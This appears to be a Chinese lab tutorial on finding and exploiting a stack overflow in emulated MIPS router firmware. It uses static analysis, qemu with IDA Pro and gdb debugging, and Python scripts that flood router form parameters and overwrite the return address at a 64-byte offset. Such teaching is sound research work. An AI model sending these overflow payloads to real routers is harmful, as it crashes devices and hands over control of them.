![image.png](https://cdn.nlark.com/yuque/0/2024/png/27444040/1711014254969-65bf7539-f714-4d3b-a975-fb30237fee01.png#averageHue=%2385a853&clientId=ud8a14ec6-f2c0-4&from=paste&height=678&id=ue6f61d11&originHeight=1017&originWidth=1761&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=224744&status=done&style=none&taskId=u12247770-27d6-4a0c-97c8-03ca7a1f1a8&title=&width=1174)
默认即可
![image.png](https://cdn.nlark.com/yuque/0/2024/png/27444040/1711014309008-6afd523d-658f-4914-9b3f-75400da887d7.png#averageHue=%236fa971&clientId=ud8a14ec6-f2c0-4&from=paste&height=809&id=u8a5bc3c0&originHeight=1213&originWidth=2098&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=471300&status=done&style=none&taskId=u28616521-32c8-414e-8f27-c895e619617&title=&width=1398.6666666666667)
等右下角的进度条消失，就说明程序已经被分析完了
![image.png](https://cdn.nlark.com/yuque/0/2024/png/27444040/1711014352318-08d7ab6b-6c73-4ae4-b9d6-4684769521da.png#averageHue=%23bbb157&clientId=ud8a14ec6-f2c0-4&from=paste&height=675&id=u1654b116&originHeight=1012&originWidth=1770&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=214228&status=done&style=none&taskId=u38697248-0490-4dc7-98a1-d0446363cf4&title=&width=1180)
路由器漏洞的挖掘有一些技巧，比如可以直接定位一些调用危险函数的地方，这里举例一些危险函数
### 危险函数
strcpy 是 C 语言标准库中的一个函数，其原型定义在 <string.h> 头文件中。该函数用于将一个字符串复制到另一个字符串中
虽然 strcpy 在字符串操作中非常常用，但它也带来了显著的安全隐患，主要是因为它不检查目标缓冲区的大小，这可能导致缓冲区溢出
如果源字符串的长度超过了目标缓冲区的大小，strcpy 会继续复制字符到目标缓冲区之外的内存区域，这会覆盖和破坏相邻的内存，导致数据损坏、程序崩溃，甚至可能允许攻击者执行任意代码

system 是 C 语言标准库中的一个函数，用于在当前程序中执行一个命令行指令。它的原型定义在 <stdlib.h> 头文件中，允许程序调用外部程序或执行 shell 命令
虽然 system 函数为程序提供了执行外部命令的强大功能，但它也可能造成命令注入攻击：如果 system 函数的输入来自不可信的用户输入，攻击者可能会注入恶意命令，导致程序执行未授权的命令。这可能会泄露敏感信息、破坏系统或为攻击者提供系统访问权限
环境安全风险：system 函数创建的子进程会继承其父进程（即当前程序）的用户权限。如果程序以高权限（如 root 用户）运行，那么通过 system 执行的命令也将具有这些权限，从而可能被滥用来执行危险的操作

我们可以通过搜索这两个函数来挖掘路由器的漏洞，按住ctrl+shift+e，呼出搜索界面，搜索strcpy函数
![](https://img-blog.csdnimg.cn/direct/898cdbb43572411bbe90d36b20d85f69.png#id=FnLLC&originHeight=558&originWidth=708&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
注意要勾选上图中的选项和点击搜索全部
![](https://img-blog.csdnimg.cn/direct/d2f2c97337ad442db3270897dff1b6a3.png#id=aqQjQ&originHeight=638&originWidth=793&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
这些就是程序调用了strcpy的地方，点击就能看到对应函数伪代码
![](https://img-blog.csdnimg.cn/direct/347f03a2da8d4c7898bd0057fbed8d7a.png#id=Pw5S6&originHeight=635&originWidth=1484&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
把这些搜索到的调用strcpy函数的地方一个一个看，很容易发现栈溢出漏洞

这次演示的漏洞点在saveParentControlInfo函数处
![image.png](https://cdn.nlark.com/yuque/0/2024/png/27444040/1710928440087-de1a2a43-3756-4d32-a3d4-5058b6af7b20.png#averageHue=%23fcfcfa&clientId=uc343bc35-c270-4&from=paste&height=386&id=ud053b3e8&originHeight=579&originWidth=631&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=75116&status=done&style=none&taskId=ua3e6a05b-ba9f-4b2e-a13d-72c14170b07&title=&width=420.6666666666667)
程序进入了一个名为compare_parentcontrol_time的函数里
![image.png](https://cdn.nlark.com/yuque/0/2024/png/27444040/1710929768098-91c0f02b-b556-4d5d-9b51-53a848cb464f.png#averageHue=%23faf4f1&clientId=uc343bc35-c270-4&from=paste&height=165&id=u840b47eb&originHeight=247&originWidth=628&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=36778&status=done&style=none&taskId=u14627bca-8bb2-4e4a-b3ce-886fa65ab46&title=&width=418.6666666666667)
只有让iVar2=0才能进入到这个if判断里
![image.png](https://cdn.nlark.com/yuque/0/2024/png/27444040/1710929951394-6fe8e801-fc97-4241-8b16-273746eb364a.png#averageHue=%23fdfcfc&clientId=uc343bc35-c270-4&from=paste&height=308&id=ubde5f791&originHeight=462&originWidth=570&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=51377&status=done&style=none&taskId=uff11582f-f85d-4e12-a60c-8f373af05a2&title=&width=380)
在compare_parentcontrol_time函数中，函数获取了名为time的参数名，并将参数的值赋予了__s变量里
![image.png](https://cdn.nlark.com/yuque/0/2024/png/27444040/1710930088767-1cfb6937-d2e7-4520-8bf1-158f6d5fd8a0.png#averageHue=%23fbf6f5&clientId=uc343bc35-c270-4&from=paste&height=201&id=uc05f0c20&originHeight=301&originWidth=1321&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=64577&status=done&style=none&taskId=u157dead0-70a7-4e73-8527-98425c36eb0&title=&width=880.6666666666666)
如果__s变量是空的值，那么uVar1=1了
![image.png](https://cdn.nlark.com/yuque/0/2024/png/27444040/1710930201137-b9f56472-0b56-45d5-bbf3-c49e64eb4c36.png#averageHue=%23fdfcfc&clientId=uc343bc35-c270-4&from=paste&height=169&id=ua0a6358a&originHeight=253&originWidth=642&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=26662&status=done&style=none&taskId=ua3348499-90f2-46d8-82f0-a6b45ccf7bb&title=&width=428)
程序最下面return的就是uVar1这个变量，如果uVar1=1，那么无法进入父函数的if判断里，所以这里不能使__s变量为空，要传入time的参数名
![image.png](https://cdn.nlark.com/yuque/0/2024/png/27444040/1710930239385-c742f213-283c-4de9-943b-7291649936e1.png#averageHue=%23bbad54&clientId=uc343bc35-c270-4&from=paste&height=131&id=u2ee4e449&originHeight=196&originWidth=553&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=16601&status=done&style=none&taskId=ub1968bdd-15ee-4f0d-bd16-d44d1c76640&title=&width=368.6666666666667)
进入if判断后，有一个strcpy函数，它会将__src变量里的字符串复制到__s+2处，但是__src获取的变量名为devicId，我们只能输入time才能进入到这个if判断
![image.png](https://cdn.nlark.com/yuque/0/2024/png/27444040/1710931094779-0e36e4fe-2748-49dd-856b-60938e9f7582.png#averageHue=%23fbf7f5&clientId=uc343bc35-c270-4&from=paste&height=214&id=u6258c223&originHeight=321&originWidth=562&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=50320&status=done&style=none&taskId=u969fb233-18ac-4a51-9869-1ced1da8972&title=&width=374.6666666666667)
再下面，程序进入了get_parentControl_list_Info函数
![image.png](https://cdn.nlark.com/yuque/0/2024/png/27444040/1710931495636-5e693f05-c719-4efe-876b-16d684254509.png#averageHue=%23faf5f1&clientId=uc343bc35-c270-4&from=paste&height=187&id=u35351390&originHeight=280&originWidth=607&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=42809&status=done&style=none&taskId=u90a83c7f-7136-47f3-8380-cea6ca50447&title=&width=404.6666666666667)
程序这里刚好获取了一个名为time的函数，然后在下面使用了strcpy函数将__src__00变量里的值复制到parm_2+2的地址里，strcpy这个函数不会检测字符串的长度，很容易造成缓冲区溢出
![image.png](https://cdn.nlark.com/yuque/0/2024/png/27444040/1710931725680-dc8356e3-b4dc-4253-a3b8-99b8751a8b0e.png#averageHue=%23faf5f3&clientId=uc343bc35-c270-4&from=paste&height=251&id=ua05cd861&originHeight=376&originWidth=1441&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=112441&status=done&style=none&taskId=ue332bbe2-7b3f-4817-ad3f-a38238479ad&title=&width=960.6666666666666)
交叉定位调用saveParentControlInfo函数的路由saveParentControlInfo
![image.png](https://cdn.nlark.com/yuque/0/2024/png/27444040/1710931931108-03584098-588e-4175-b190-92a147025206.png#averageHue=%23f2ec75&clientId=uc343bc35-c270-4&from=paste&height=200&id=u23cf873a&originHeight=300&originWidth=630&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=69449&status=done&style=none&taskId=u2dc4d00f-1199-4058-af03-7e0511fb50d&title=&width=420)
payload：
```
import requests

url = "http://192.168.85.131/goform/saveParentControlInfo"
data = {
    "time":b'A'*10000
}
res = requests.post(url=url,data=data)
print(res.content)
```
![](https://cdn.nlark.com/yuque/0/2024/png/27444040/1709125835064-5226e17d-abe1-486f-b4cb-a117a8080750.png?x-oss-process=image%2Fformat%2Cwebp#averageHue=%23f7e9e0&from=url&id=wU3Mz&originHeight=560&originWidth=865&originalType=binary&ratio=1.5&rotation=0&showTitle=false&status=done&style=none&title=)
运行脚本
![](https://cdn.nlark.com/yuque/0/2024/png/27444040/1709125854000-ece6b036-94b2-403c-b54f-350f25514390.png?x-oss-process=image%2Fformat%2Cwebp#averageHue=%23151512&from=url&id=SdLN4&originHeight=90&originWidth=546&originalType=binary&ratio=1.5&rotation=0&showTitle=false&status=done&style=none&title=)
程序段错误退出，路由器崩溃
![](https://cdn.nlark.com/yuque/0/2024/png/27444040/1709125856357-9587a296-cd39-4b81-b66a-7b7d4db65127.png?x-oss-process=image%2Fformat%2Cwebp#averageHue=%2316100c&from=url&id=jNHY0&originHeight=310&originWidth=865&originalType=binary&ratio=1.5&rotation=0&showTitle=false&status=done&style=none&title=)
![](https://cdn.nlark.com/yuque/0/2024/png/27444040/1709125867298-989e1e62-0d0a-4972-b13a-b9511b9b3a09.png?x-oss-process=image%2Fformat%2Cwebp#averageHue=%23202027&from=url&id=bGmBY&originHeight=597&originWidth=865&originalType=binary&ratio=1.5&rotation=0&showTitle=false&status=done&style=none&title=)
静态逆向分析程序找到的漏洞多数都是栈溢出，要利用栈溢出来达到命令执行的程度还需要动态调试程序
# 动态调试分析
qemu自带了gdbserver的功能，直接加上-g参数就能启动gdbserver
```
qemu-mipsel-static -L . -g 2000 ./bin/httpd #-g：开启2000端口debugger
```
![image.png](https://cdn.nlark.com/yuque/0/2024/png/27444040/1711363585714-2add2301-78e9-4655-8ed6-5c8bc315bf74.png#averageHue=%230d5249&clientId=ued6d1bb4-f505-4&from=paste&height=109&id=u6a339772&originHeight=109&originWidth=825&originalType=binary&ratio=1&rotation=0&showTitle=false&size=21485&status=done&style=none&taskId=u6382432a-490e-4f52-bb65-4697820ee7f&title=&width=825)
现在程序正在等待连接，使用gdb或者ida pro都可以连接进行动态调试
## ida pro
将httpd文件拖到实体机的桌面上
![image.png](https://cdn.nlark.com/yuque/0/2024/png/27444040/1711363845135-ce3fb872-aebd-4bf8-97fd-bdfa6179b50a.png#averageHue=%23292e3a&clientId=ued6d1bb4-f505-4&from=paste&height=538&id=u886d48af&originHeight=538&originWidth=1335&originalType=binary&ratio=1&rotation=0&showTitle=false&size=71124&status=done&style=none&taskId=ud02c57cb-8a97-4c50-aa95-697497f430d&title=&width=1335)
然后拖入ida.exe打开，全部默认即可
![image.png](https://cdn.nlark.com/yuque/0/2024/png/27444040/1711363880932-d7e1fe61-abf0-411b-9bc3-0a2e9b002e1f.png#averageHue=%234e4c4c&clientId=ued6d1bb4-f505-4&from=paste&height=515&id=u16b91bee&originHeight=515&originWidth=937&originalType=binary&ratio=1&rotation=0&showTitle=false&size=57772&status=done&style=none&taskId=u794cab49-9e38-40d0-9701-d048ddb5a8a&title=&width=937)
进入软件后，在任务栏里选择远程gdb调试，点击ok
![image.png](https://cdn.nlark.com/yuque/0/2024/png/27444040/1711363915326-a5fd893c-3019-4261-ab3e-3ff792535736.png#averageHue=%23f5f4f4&clientId=ued6d1bb4-f505-4&from=paste&height=1250&id=uf852b409&originHeight=1250&originWidth=1940&originalType=binary&ratio=1&rotation=0&showTitle=false&size=296732&status=done&style=none&taskId=ue6100f85-8a87-4f69-9f86-b2e101ea53f&title=&width=1940)
点击绿色的图标，选择yes
![image.png](https://cdn.nlark.com/yuque/0/2024/png/27444040/1711363965877-ca077dad-1078-44a6-afdb-66439ced4c52.png#averageHue=%232d863e&clientId=ued6d1bb4-f505-4&from=paste&height=1135&id=u108997a0&originHeight=1135&originWidth=1386&originalType=binary&ratio=1&rotation=0&showTitle=false&size=146614&status=done&style=none&taskId=u9e41d312-2dc1-4a5d-90cf-2a0dd6f0709&title=&width=1386)
输入虚拟机kali ip（不是路由器的ip）和刚刚开启的端口，点击ok
![image.png](https://cdn.nlark.com/yuque/0/2024/png/27444040/1711364059665-b1398a43-b843-4c50-ab72-41ad746b4c6a.png#averageHue=%23f0eeed&clientId=ued6d1bb4-f505-4&from=paste&height=363&id=u66acb42d&originHeight=363&originWidth=781&originalType=binary&ratio=1&rotation=0&showTitle=false&size=33755&status=done&style=none&taskId=u0b726325-5679-42e9-b752-29ea758a651&title=&width=781)
然后就进入远程动态调试界面了
![image.png](https://cdn.nlark.com/yuque/0/2024/png/27444040/1711364092655-307828bd-d3ae-402f-8c4d-a8ac9881a886.png#averageHue=%239db15e&clientId=ued6d1bb4-f505-4&from=paste&height=1239&id=u38ecbe2a&originHeight=1239&originWidth=2560&originalType=binary&ratio=1&rotation=0&showTitle=false&size=265972&status=done&style=none&taskId=ud0586d5a-9bd4-475a-b46a-aa57e381b7d&title=&width=2560)
## gdb
gdb连接gdbserver需要gdb-multiarch，gdb-multiarch 是 GNU Debugger (GDB) 的一个变种，它支持多种体系结构。GDB 是一个强大的开源调试工具，常用于程序的调试、分析运行时错误，以及检查程序内部运行状态等任务。默认情况下，GDB 通常针对特定的体系结构或目标平台（如 x86、ARM）编译和配置。这意味着，如果你需要调试一个不同体系结构的程序，你可能需要使用为那个特定体系结构编译的 GDB 版本。

gdb-multiarch 解决了这个限制。它通过包含对多种体系结构的支持，允许开发者使用单一的 GDB 实例来调试不同体系结构的程序。这样，无论是本地还是远程调试，无论目标程序是运行在 x86、ARM、MIPS 或其他任何 GDB 支持的体系结构上，你都可以使用相同的 gdb-multiarch 实例来进行调试
安装：
```
apt install gdb-multiarch
```
使用：
```
gdb-multiarch 程序名
```
进入后输入remote指令就能连接了
```
target remote 127.0.0.1:2000
```
![image.png](https://cdn.nlark.com/yuque/0/2024/png/27444040/1711364738618-6231552a-f906-43d4-940f-729c86696ec7.png#averageHue=%23060607&clientId=ued6d1bb4-f505-4&from=paste&height=898&id=ue38723f1&originHeight=898&originWidth=1525&originalType=binary&ratio=1&rotation=0&showTitle=false&size=209246&status=done&style=none&taskId=u7418f8a5-68cf-4136-8167-62e91b65075&title=&width=1525)
## MISP
### 寄存器
```
zero 常数零
$at	汇编器保留
$v0，$v1 子程序返回值
$a0-$a3	子程序参数
$t0-$t7	临时寄存器（调用者保存）
$s0-$s7	保存寄存器（被调用者保存）
$t8，$t9 临时寄存器（调用者保存）
$k0，$k1 操作系统保留
$gp	全局指针
$sp	栈指针
$fp	帧指针
$ra	返回地址
```
其中，最重要的是$ra相当于rat指令，后面的参数是函数返回时调用的内存地址，$sp相当于栈顶指针，$a0-$a3是存放参数用的
### 叶子函数（Leaf Function）
叶子函数是指在其执行过程中不调用其他函数的函数。这意味着叶子函数只执行操作而不“分支”到程序的其他部分。由于叶子函数不进行任何函数调用，它们通常直接执行计算或操作，然后返回结果。这种函数的特点是执行路径简单，资源需求相对可预测。
叶子函数的特点：不包含对其他函数的调用。执行过程中不需要为其他函数调用保留额外的栈空间。通常执行时间较短，资源使用较少。
### 非叶子函数（Non-Leaf Function）
非叶子函数是指在其执行过程中至少调用一个其他函数的函数。这种函数的执行可能依赖于它调用的其他函数的结果。非叶子函数可能涉及更复杂的逻辑和操作，执行路径可能因为其中包含的函数调用而变得复杂。
非叶子函数的特点：包含至少一个对其他函数的调用。执行过程中需要为被调用的函数分配栈空间。由于包含函数调用，其执行时间和资源使用可能不如叶子函数容易预测
```
// 叶子函数示例
int add(int a, int b) {
    return a + b;
}

// 非叶子函数示例
int add_and_double(int a, int b) {
    int sum = add(a, b); // 调用了另一个函数 add
    return sum * 2;
}
```
## 动态调试控制程序指针
在构造MISP rop链时，这个ida pro插件很好用
```
https://github.com/grayhatacademy/ida/tree/master
```
下载完后将shims和mipsrop文件夹里的py文件放到idapro的plugins文件夹里
![image.png](https://cdn.nlark.com/yuque/0/2024/png/27444040/1711366542696-07c6494a-889b-4d30-bb5b-64a762404fa4.png#averageHue=%23222120&clientId=ued6d1bb4-f505-4&from=paste&height=951&id=u61a18481&originHeight=951&originWidth=2552&originalType=binary&ratio=1&rotation=0&showTitle=false&size=313663&status=done&style=none&taskId=u8c9086af-f5b2-4d5d-8c01-a6a815df1a9&title=&width=2552)
放进去后编辑一下mipsrop.py文件
![image.png](https://cdn.nlark.com/yuque/0/2024/png/27444040/1711366575062-948f4585-758d-4143-9480-f9c441427bdf.png#averageHue=%23232221&clientId=ued6d1bb4-f505-4&from=paste&height=953&id=u08ef438a&originHeight=953&originWidth=1461&originalType=binary&ratio=1&rotation=0&showTitle=false&size=186004&status=done&style=none&taskId=ua03c854c-5b1b-43c6-a5a2-b054429bf80&title=&width=1461)
将
```
from shims import ida_shims
```
改成
```
import ida_shims
```
![image.png](https://cdn.nlark.com/yuque/0/2024/png/27444040/1711366632870-31c2b84e-aba1-4681-aa75-dc051dbbd346.png#averageHue=%23353d46&clientId=ued6d1bb4-f505-4&from=paste&height=978&id=u93ad9494&originHeight=978&originWidth=1204&originalType=binary&ratio=1&rotation=0&showTitle=false&size=215532&status=done&style=none&taskId=ue8edd892-0168-4778-b656-c35070b10f5&title=&width=1204)
保存后重启idapro，然后在任务栏里的search功能里可以看到mips rpo gadgets插件了，之后会讲如何使用这个插件
![image.png](https://cdn.nlark.com/yuque/0/2024/png/27444040/1711366700352-f0347a62-1e54-43c5-b3b3-e1f2f57b5c48.png#averageHue=%23c0c483&clientId=ued6d1bb4-f505-4&from=paste&height=678&id=ufef68013&originHeight=678&originWidth=722&originalType=binary&ratio=1&rotation=0&showTitle=false&size=82775&status=done&style=none&taskId=u3eae8a96-92c1-4e8c-83a3-99d9c47dcd2&title=&width=722)
启用远程动态调试
```
qemu-mipsel-static -L . -g 2000 ./bin/httpd #-g：开启2000端口debugger
```
ida 远程连接
![image.png](https://cdn.nlark.com/yuque/0/2024/png/27444040/1711366261540-4ebda200-2a76-429f-a2f8-1af6c40422fe.png#averageHue=%234eac50&clientId=ued6d1bb4-f505-4&from=paste&height=1383&id=u6f1392bd&originHeight=1383&originWidth=2421&originalType=binary&ratio=1&rotation=0&showTitle=false&size=304065&status=done&style=none&taskId=u31fb7524-8495-41eb-b1ba-dd678532d86&title=&width=2421)
点击这个绿标运行程序
![image.png](https://cdn.nlark.com/yuque/0/2024/png/27444040/1711366760634-7c813a63-4d91-4bf8-8dbe-61fb0a594fdd.png#averageHue=%23cafefd&clientId=ued6d1bb4-f505-4&from=paste&height=675&id=ud704f3b9&originHeight=675&originWidth=1290&originalType=binary&ratio=1&rotation=0&showTitle=false&size=106519&status=done&style=none&taskId=ub525b5a5-a68b-4afa-a265-f0a525c9a95&title=&width=1290)
需要等待1分钟
![image.png](https://cdn.nlark.com/yuque/0/2024/png/27444040/1711366779846-f207ad70-b6a7-49da-9306-e0fe3ae868ef.png#averageHue=%23c8fbfb&clientId=ued6d1bb4-f505-4&from=paste&height=501&id=u8d462c38&originHeight=501&originWidth=745&originalType=binary&ratio=1&rotation=0&showTitle=false&size=42048&status=done&style=none&taskId=udc06a653-82d5-4b9c-b309-2f891b29871&title=&width=745)
弹出提示后就说明正在运行了，选择ok即可

我们静态分析找到漏洞点后，可以写脚本造成程序段错误，现在我们为了拿到shell，要找到具体的溢出数值是多少
```
import requests

url = "http://192.168.85.133/goform/SetSysTimeCfg"
data = {
    "timeZone":b'A'*1000
}
res = requests.post(url,data=data)
print(res.text)
```
![](https://cdn.nlark.com/yuque/0/2024/png/27444040/1709125856357-9587a296-cd39-4b81-b66a-7b7d4db65127.png?x-oss-process=image%2Fformat%2Cwebp%2Fresize%2Cw_750%2Climit_0#averageHue=%2316100c&from=url&id=kBReB&originHeight=269&originWidth=750&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
进入gdb，生成垃圾字符
```
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaaejaaekaaelaaemaaenaaeoaaepaaeqaaeraaesaaetaaeuaaevaaewaaexaaeyaaezaafbaafcaafdaafeaaffaafgaafhaafiaafjaafkaaflaafmaafnaafoaafpaafqaafraafsaaftaafuaafvaafwaafxaafyaafzaagbaagcaagdaageaagfaaggaaghaagiaagjaagkaaglaagmaagnaagoaagpaagqaagraagsaagtaaguaagvaagwaagxaagyaagzaahbaahcaahdaaheaahfaahgaahhaahiaahjaahkaahlaahmaahnaahoaahpaahqaahraahsaahtaahuaahvaahwaahxaahyaahzaaibaaicaaidaaieaaifaaigaaihaaiiaaijaaikaailaaimaainaaioaaipaaiqaairaaisaaitaaiuaaivaaiwaaixaaiyaaizaajbaajcaajdaajeaajfaajgaajhaajiaajjaajkaajlaajmaajnaajoaajpaajqaajraajsaajtaajuaajvaajwaajxaajyaaj
```
![image.png](https://cdn.nlark.com/yuque/0/2024/png/27444040/1711367040468-b8ca7938-022a-4485-b7ad-75c465fd5cc5.png#averageHue=%23141415&clientId=ued6d1bb4-f505-4&from=paste&height=224&id=u893b19a9&originHeight=224&originWidth=1039&originalType=binary&ratio=1&rotation=0&showTitle=false&size=46926&status=done&style=none&taskId=u75997ffa-4122-4639-98e3-d5f2e136b84&title=&width=1039)
将这些字符串替换成脚本里的垃圾字符串
```
import requests

url = "http://192.168.85.133/goform/SetSysTimeCfg"
data = {
    "timeZone":b'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaaejaaekaaelaaemaaenaaeoaaepaaeqaaeraaesaaetaaeuaaevaaewaaexaaeyaaezaafbaafcaafdaafeaaffaafgaafhaafiaafjaafkaaflaafmaafnaafoaafpaafqaafraafsaaftaafuaafvaafwaafxaafyaafzaagbaagcaagdaageaagfaaggaaghaagiaagjaagkaaglaagmaagnaagoaagpaagqaagraagsaagtaaguaagvaagwaagxaagyaagzaahbaahcaahdaaheaahfaahgaahhaahiaahjaahkaahlaahmaahnaahoaahpaahqaahraahsaahtaahuaahvaahwaahxaahyaahzaaibaaicaaidaaieaaifaaigaaihaaiiaaijaaikaailaaimaainaaioaaipaaiqaairaaisaaitaaiuaaivaaiwaaixaaiyaaizaajbaajcaajdaajeaajfaajgaajhaajiaajjaajkaajlaajmaajnaajoaajpaajqaajraajsaajtaajuaajvaajwaajxaajyaaj'*1000
}
res = requests.post(url,data=data)
print(res.text)
```
保证idapro在远程调试状态后，执行脚本
![image.png](https://cdn.nlark.com/yuque/0/2024/png/27444040/1711367161807-18efb0ac-5c7c-495c-bdc6-07a3d4406752.png#averageHue=%23080809&clientId=ued6d1bb4-f505-4&from=paste&height=191&id=u72787a81&originHeight=191&originWidth=435&originalType=binary&ratio=1&rotation=0&showTitle=false&size=11300&status=done&style=none&taskId=uae9c35c3-3841-4e1c-aa29-88d91c7221b&title=&width=435)
现在脚本正在等待idapro程序运行，回到idapro，点击绿色图标，执行脚本里的内容
![image.png](https://cdn.nlark.com/yuque/0/2024/png/27444040/1711367201549-31e2de8d-e751-4f78-b9d0-3308247a4835.png#averageHue=%23cbfefd&clientId=ued6d1bb4-f505-4&from=paste&height=691&id=ub3b5a21b&originHeight=691&originWidth=1550&originalType=binary&ratio=1&rotation=0&showTitle=false&size=119429&status=done&style=none&taskId=u71e6c765-c481-49a4-aa0a-d293cdd27ff&title=&width=1550)
选择yes
![image.png](https://cdn.nlark.com/yuque/0/2024/png/27444040/1711367241637-1bdfa998-7fc5-409c-a8c6-68bf669646cb.png#averageHue=%2332982d&clientId=ued6d1bb4-f505-4&from=paste&height=548&id=u7737ecef&originHeight=548&originWidth=974&originalType=binary&ratio=1&rotation=0&showTitle=false&size=69495&status=done&style=none&taskId=u096917cf-2eb0-4b0a-b027-ac7df454973&title=&width=974)
现在程序报错，提示段错误，现在我们去查看idapro右边的寄存器窗口
![image.png](https://cdn.nlark.com/yuque/0/2024/png/27444040/1711367569643-89128a46-2e58-4338-b739-c22409069763.png#averageHue=%23369428&clientId=ued6d1bb4-f505-4&from=paste&height=460&id=u3143ddb7&originHeight=460&originWidth=1237&originalType=binary&ratio=1&rotation=0&showTitle=false&size=81421&status=done&style=none&taskId=u68558dd3-64ab-4ef1-adfb-46f397b088c&title=&width=1237)
![image.png](https://cdn.nlark.com/yuque/0/2024/png/27444040/1711367582056-98e7ddf6-13cb-43b3-ab16-0d4e9f301491.png#averageHue=%2366af52&clientId=ued6d1bb4-f505-4&from=paste&height=1530&id=ub10e935d&originHeight=1530&originWidth=2562&originalType=binary&ratio=1&rotation=0&showTitle=false&size=356544&status=done&style=none&taskId=ufad61bae-728c-40b8-ab91-687b4776db8&title=&width=2562)
拉到最下面，可以看到$fp和$ra寄存器都变成了垃圾字符
![image.png](https://cdn.nlark.com/yuque/0/2024/png/27444040/1711367684144-56deec95-505c-40f9-8446-a35162de1913.png#averageHue=%230e0e10&clientId=ued6d1bb4-f505-4&from=paste&height=307&id=u04d9d51c&originHeight=307&originWidth=638&originalType=binary&ratio=1&rotation=0&showTitle=false&size=37099&status=done&style=none&taskId=u6b05ea6a-343b-423c-b0d7-fa41493d14d&title=&width=638)
这里最重要的是$ra寄存器，作用和ret指令差不多，控制了这个寄存器，就相当于控制了程序的执行流，他的值是61616171转换成ascii码是aaaq，这里有一个知识点，这个MISP是一个小端序，字符串是由低到高存储的，所以这里应该是qaaa，回到gdb，搜索qaaa
```
qaaa
```
![image.png](https://cdn.nlark.com/yuque/0/2024/png/27444040/1711368055472-3dbf840d-8fe9-40f2-b059-518ab3d932be.png#averageHue=%23060608&clientId=ued6d1bb4-f505-4&from=paste&height=120&id=u34f6a34d&originHeight=120&originWidth=516&originalType=binary&ratio=1&rotation=0&showTitle=false&size=15648&status=done&style=none&taskId=ueb1a0526-f29f-49e3-95ab-16bd551e3a7&title=&width=516)
覆盖到$ra寄存器需要64个字符，之后就是寻找我们要跳转的地址了
现在我们可以测试一下，让程序跳转到开头处，再执行一次welcome
![image.png](https://cdn.nlark.com/yuque/0/2024/png/27444040/1711369648274-de705bb8-bd82-43e6-b5d0-1c601d825144.png#averageHue=%23070708&clientId=ued6d1bb4-f505-4&from=paste&height=173&id=u74e2ec6d&originHeight=173&originWidth=573&originalType=binary&ratio=1&rotation=0&showTitle=false&size=17723&status=done&style=none&taskId=u500e96d0-4159-4d7f-957c-a77e7d4b9e5&title=&width=573)
找到welcome字符处
![image.png](https://cdn.nlark.com/yuque/0/2024/png/27444040/1711369684446-41ad183a-0b7c-41bf-bd30-c71728a72231.png#averageHue=%23fcfbfb&clientId=ued6d1bb4-f505-4&from=paste&height=1101&id=uf309e954&originHeight=1101&originWidth=1418&originalType=binary&ratio=1&rotation=0&showTitle=false&size=84597&status=done&style=none&taskId=u86816a51-f0c0-4308-adee-df4692f97f9&title=&width=1418)
交叉定位调用这个字符的地址
![image.png](https://cdn.nlark.com/yuque/0/2024/png/27444040/1711369710237-fecb4ea6-c9d0-4262-a51d-1156d74d2eeb.png#averageHue=%23fbfafa&clientId=ued6d1bb4-f505-4&from=paste&height=292&id=u92aa3a55&originHeight=292&originWidth=1177&originalType=binary&ratio=1&rotation=0&showTitle=false&size=48878&status=done&style=none&taskId=ud473a864-7528-4ad7-ba8c-7c0cf2a1d64&title=&width=1177)
![image.png](https://cdn.nlark.com/yuque/0/2024/png/27444040/1711370083759-b244d3e5-e670-4935-8fc3-56ea2cf34261.png#averageHue=%23f9f8f8&clientId=ued6d1bb4-f505-4&from=paste&height=986&id=u4d293b4c&originHeight=986&originWidth=1947&originalType=binary&ratio=1&rotation=0&showTitle=false&size=186358&status=done&style=none&taskId=u5cb8fb42-d2c3-4a5e-b36c-932114690f0&title=&width=1947)
脚本里写入
```
address = 0x0043ACB0.to_bytes(4, byteorder='little')
```
```
import requests

url = "http://192.168.85.133/goform/SetSysTimeCfg"
address = 0x0043ACB0.to_bytes(4, byteorder='little')
data = {
    "timeZone":b'A'*64 + address
}
res = requests.post(url,data=data)
print(res.text)
```
启动远程动态调试
```
qemu-mipsel-static -L . -g 2000 ./bin/httpd
```
用gdb-multiarch连接
